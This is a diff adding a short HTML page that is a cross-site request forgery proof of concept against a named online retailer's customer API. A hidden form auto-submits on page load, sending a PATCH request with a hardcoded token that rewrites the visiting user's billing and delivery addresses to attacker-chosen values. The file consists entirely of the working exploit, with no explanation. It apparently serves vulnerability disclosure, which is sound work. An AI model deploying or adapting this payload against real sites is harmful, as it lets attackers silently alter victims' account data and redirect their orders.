@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <form id="evilForm" method="PATCH" action="https://www.boozt.com/at/de-at/api/customer">
+        <input type="hidden" name="data" value='{"requisites":{"billing_firstname":"Hacked","billing_lastname":"ByMe","billing_street":"EvilStreet","billing_postcode":"666","billing_city":"Hell","billing_country":"pt","delivery_firstname":"Hacked","delivery_lastname":"ByMe","delivery_street":"EvilStreet","delivery_postcode":"666","delivery_city":"Hell","delivery_country":"pt","delivery_as_billing":true}}'>
+        <input type="hidden" name="Csrf-Token" value="f7b24e74899ced25052be23894053aab">
+    </form>
+    <script>
+        document.getElementById("evilForm").submit();
+    </script>
+</body>
+</html>
